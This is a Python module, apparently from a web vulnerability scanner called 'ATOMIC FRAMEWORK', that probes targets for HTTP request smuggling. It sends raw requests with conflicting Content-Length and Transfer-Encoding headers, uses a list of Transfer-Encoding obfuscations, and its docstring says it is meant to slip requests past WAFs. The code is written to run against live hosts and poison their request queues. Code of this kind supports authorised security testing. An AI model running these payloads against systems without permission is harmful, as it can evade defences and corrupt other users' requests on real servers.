#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK — Phase I: HTTP Request Smuggling Module

Detects CL.TE, TE.CL, TE.TE, and H2.CL request smuggling vulnerabilities.
Integrates with the WAF bypass chain for smuggling past WAFs to hit backends.
"""

import socket
import ssl
import time
import re

from config import Colors


class RequestSmugglingModule:
    """HTTP Request Smuggling detection and exploitation."""

    name = "Request Smuggling"
    vuln_type = "request_smuggling"
    requires_reflection = False

    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.verbose = engine.config.get('verbose', False)
        self.timeout = engine.config.get('timeout', 10)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def test(self, url: str, method: str = 'POST', param: str = '', value: str = '') -> None:
        """Run all request smuggling checks against the target."""
        self.test_url(url)

    def test_url(self, url: str) -> None:
        """URL-level smuggling tests (no per-parameter variation)."""
        host, port, path, use_ssl = self._parse_url(url)
        if host is None:
            return

        if self.verbose:
            print(f"{Colors.info(f'[Smuggling] Testing {url}')}")

        # CL.TE detection
        self._test_cl_te(host, port, path, use_ssl, url)

        # TE.CL detection
        self._test_te_cl(host, port, path, use_ssl, url)

        # TE.TE obfuscation detection
        self._test_te_te(host, port, path, use_ssl, url)

    # ------------------------------------------------------------------
    # CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
    # ------------------------------------------------------------------

    def _test_cl_te(self, host, port, path, use_ssl, url):
        """Detect CL.TE smuggling.

        Send a request where Content-Length covers only the first chunk
        marker (``0\\r\\n\\r\\n``), but the Transfer-Encoding body
        includes a smuggled prefix.  If the back-end processes the
        smuggled portion, the *next* normal request will be poisoned.
        """
        smuggled_prefix = "G]"  # invalid method → triggers 405/400 on backend
        body = (
            "0\r\n"
            "\r\n"
            f"{smuggled_prefix}"
        )
        # CL = length of "0\r\n\r\n" only (the front-end stops here)
        cl = len("0\r\n\r\n")

        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {cl}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{body}"
        )

        try:
            resp1 = self._raw_send(host, port, raw.encode(), use_ssl)
            # Now send a normal request; if poisoned the server sees "G] …"
            normal = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )
            resp2 = self._raw_send(host, port, normal.encode(), use_ssl)

            if resp2 and self._is_poisoned(resp2):
                self._add_finding(url, 'CL.TE', raw, resp2)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
    # ------------------------------------------------------------------

    def _test_te_cl(self, host, port, path, use_ssl, url):
        """Detect TE.CL smuggling."""
        # Smuggled body after chunk terminator that back-end reads via CL
        smuggled = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 10\r\n"
            f"\r\n"
            f"x=1"
        )
        chunk_data = smuggled.encode()
        chunk_line = f"{len(chunk_data):x}\r\n".encode()

        body = chunk_line + chunk_data + b"\r\n0\r\n\r\n"

        # CL is intentionally large so back-end reads past chunk end
        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body) + 50}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
        ).encode() + body

        try:
            resp = self._raw_send(host, port, raw, use_ssl)
            if resp and (b'HTTP/1.1 400' in resp or b'HTTP/1.1 405' in resp
                         or self._is_timeout_differential(host, port, path, use_ssl)):
                self._add_finding(url, 'TE.CL', raw.decode(errors='replace'), resp)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # TE.TE: Transfer-Encoding obfuscation
    # ------------------------------------------------------------------

    _TE_OBFUSCATIONS = [
        "Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: xchunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
        "X: x\r\nTransfer-Encoding: chunked",
    ]

    def _test_te_te(self, host, port, path, use_ssl, url):
        """Try various TE obfuscations to find disagreements."""
        for te_variant in self._TE_OBFUSCATIONS:
            raw = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_variant}\r\n"
                f"\r\n"
                f"0\r\n\r\nSMUGGLED"
            )
            try:
                resp = self._raw_send(host, port, raw.encode(), use_ssl)
                if resp and b'SMUGGLED' in resp:
                    self._add_finding(url, f'TE.TE ({te_variant.split(chr(13))[0]})',
                                      raw, resp)
                    break  # one proof is enough
            except Exception:
                continue

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _parse_url(url):
        """Extract host, port, path, use_ssl from *url*."""
        try:
            from urllib.parse import urlparse
            p = urlparse(url)
            use_ssl = p.scheme == 'https'
            host = p.hostname or ''
            port = p.port or (443 if use_ssl else 80)
            path = p.path or '/'
            if p.query:
                path += f'?{p.query}'
            return host, port, path, use_ssl
        except Exception:
            return None, None, None, None

    def _raw_send(self, host, port, data, use_ssl, timeout=None):
        """Send raw bytes and return the response bytes."""
        timeout = timeout or self.timeout
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((host, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(data)
            resp = b''
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                except socket.timeout:
                    break
            return resp
        except Exception:
            return None
        finally:
            try:
                sock.close()
            except Exception:
                pass

    @staticmethod
    def _is_poisoned(resp):
        """Heuristic: the follow-up response shows signs of smuggling."""
        if isinstance(resp, bytes):
            resp_str = resp.decode(errors='replace')
        else:
            resp_str = resp
        indicators = [
            'HTTP/1.1 405', 'HTTP/1.1 400', 'HTTP/1.0 400',
            'Unrecognized method', 'Invalid request',
            'Bad Request', 'Method Not Allowed',
        ]
        return any(ind in resp_str for ind in indicators)

    def _is_timeout_differential(self, host, port, path, use_ssl):
        """Check if a normal GET now hangs (queued smuggled request)."""
        normal = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        start = time.time()
        self._raw_send(host, port, normal.encode(), use_ssl, timeout=5)
        elapsed = time.time() - start
        return elapsed >= 4.5  # timed out → likely poisoned

    def _add_finding(self, url, variant, raw_request, raw_response):
        """Register a confirmed smuggling finding."""
        try:
            from core.engine import Finding
            resp_preview = ''
            if raw_response:
                if isinstance(raw_response, bytes):
                    resp_preview = raw_response[:500].decode(errors='replace')
                else:
                    resp_preview = str(raw_response)[:500]

            finding = Finding(
                technique=f'HTTP Request Smuggling ({variant})',
                url=url,
                method='POST',
                param='',
                payload=str(raw_request)[:300] if raw_request else variant,
                evidence=resp_preview,
                severity='CRITICAL',
                confidence=0.75,
            )
            self.engine.add_finding(finding)
        except Exception:
            pass
